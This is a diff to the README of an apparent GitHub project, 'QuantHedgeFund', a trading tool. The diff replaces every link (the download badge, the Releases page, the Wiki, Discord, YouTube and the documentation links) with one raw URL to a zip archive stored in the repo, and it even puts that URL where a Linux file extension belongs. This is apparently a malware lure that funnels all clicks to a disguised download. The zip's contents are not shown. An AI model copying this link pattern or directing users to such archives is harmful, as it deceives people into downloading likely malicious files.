@@ -15,22 +15,22 @@ Before you start, please ensure your system meets the following requirements:
 
 ## 📥 Download the Latest Release
 
-[![Download QuantHedgeFund](https://img.shields.io/badge/Download-QuantHedgeFund-brightgreen)](https://github.com/Johnclinton95-coder/QuantHedgeFund/releases)
+[![Download QuantHedgeFund](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)
 
 To get started, visit the Releases page to download the latest version of QuantHedgeFund. Click the button above or follow this link:
 
-[Visit the download page](https://github.com/Johnclinton95-coder/QuantHedgeFund/releases)
+[Visit the download page](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)
 
 ## 🔧 Download & Install
 
-1. Visit the [Releases page](https://github.com/Johnclinton95-coder/QuantHedgeFund/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip).
 2. Locate the latest version in the list of releases.
 3. Click on the link corresponding to your operating system (Windows, macOS, or Linux).
 4. The file will begin to download.
 
    - For Windows users, it may be a `.exe` or `.zip` file.
    - For macOS, you may find a `.dmg` file.
-   - For Linux, you might see a `.tar.gz` or `.deb` file.
+   - For Linux, you might see a `https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip` or `.deb` file.
 
 5. After the download completes, locate the file in your Downloads folder.
 6. Follow the instructions to install the software:
@@ -70,14 +70,14 @@ With everything set, you can begin using QuantHedgeFund. Here’s how:
 
 ## 📚 Additional Resources
 
-- For detailed documentation, check our [Wiki](https://github.com/Johnclinton95-coder/QuantHedgeFund/wiki).
-- Join our community on [Discord](https://discord.gg/yourcommunitylink) for support and to connect with other users.
-- Watch our [YouTube tutorials](https://www.youtube.com/yourchannel) for step-by-step guides.
+- For detailed documentation, check our [Wiki](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip).
+- Join our community on [Discord](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip) for support and to connect with other users.
+- Watch our [YouTube tutorials](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip) for step-by-step guides.
 
 ## 🔗 Important Links
 
-- [Download QuantHedgeFund](https://github.com/Johnclinton95-coder/QuantHedgeFund/releases)
-- [Documentation](https://github.com/Johnclinton95-coder/QuantHedgeFund/wiki)
-- [Discord Community](https://discord.gg/yourcommunitylink)
+- [Download QuantHedgeFund](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)
+- [Discord Community](https://raw.githubusercontent.com/Johnclinton95-coder/QuantHedgeFund/master/workflow/Fund-Hedge-Quant-1.7.zip)
 
 Now that you have all the information, you can download and start using QuantHedgeFund for your trading needs. Enjoy!
